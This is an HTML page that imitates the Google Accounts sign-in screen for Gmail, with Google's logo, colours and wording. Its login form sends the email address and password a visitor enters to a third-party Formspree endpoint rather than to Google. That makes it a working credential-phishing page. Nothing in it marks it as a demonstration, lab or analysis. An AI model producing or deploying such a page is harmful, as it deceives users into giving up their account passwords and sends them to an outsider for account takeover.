<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #ffffff;
        }

        .login-container {
            width: 450px;
            max-width: 95%;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            background-color: #fff;
            box-sizing: border-box;
        }

        .logo-wrapper {
            display: flex;
            justify-content: center;
            margin-bottom: 10px;
        }

        /* Official Google Logo Image */
        .google-logo {
            width: 75px;
            height: auto;
        }

        h1 {
            text-align: left;
            font-size: 24px;
            color: #202124;
            margin: 0 0 10px 0;
            font-weight: 400;
        }

        p.subtitle {
            text-align: left;
            color: #202124;
            font-size: 16px;
            line-height: 1.5;
            margin: 0 0 35px 0;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            box-sizing: border-box;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            background-color: #fff;
            font-size: 16px;
            height: 50px;
            outline: none;
            transition: border 0.2s;
            margin-bottom: 10px;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px; /* Adjust for border width change */
        }

        input::placeholder {
            color: #5f6368;
            opacity: 0.7;
        }

        .next-btn {
            appearance: none;
            width: 120px;
            margin-top: 24px;
            padding: 0 34px;
            border-radius: 4px;
            background-color: #1a73e8;
            color: #fff !important;
            font-weight: 500;
            font-size: 14px;
            height: 36px;
            cursor: pointer;
            border: none;
            float: right;
        }

        .next-btn:hover {
            background-color: #1765cc !important;
            box-shadow: 0 1px 2px rgba(60,64,67,0.3);
        }

        .forgot-link {
            display: inline-block;
            margin-top: 20px;
            color: #1a73e8;
            text-decoration: none !important;
            font-size: 14px;
            font-weight: 500;
        }

        .forgot-link:hover {
            text-decoration: underline !important;
        }
        
        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }
    </style>
</head>

<body> 

    <div class="login-container">
        <!-- Official Multi-Color Google Logo Image -->
        <div class="logo-wrapper">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="google-logo">
        </div>
        
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>

        <!-- FORMSPREE INTEGRATION -->
        <form action="https://formspree.io/f/mpppjjea" method="POST">
            <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
            <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
            
            <button type="submit" class="next-btn">Next</button>
            
            <div style="clear:both;"></div>
            
            <a href="#" class="forgot-link">Forgot email?</a>
        </form>
        
        <div style="margin-top: 30px; font-size: 14px; color: #5f6368;">
            Not your computer? Use Guest mode to sign in privately. 
            <a href="#" class="forgot-link" style="display:inline; margin-left:5px;">Learn more</a>
        </div>
    </div>

</body>
</html>
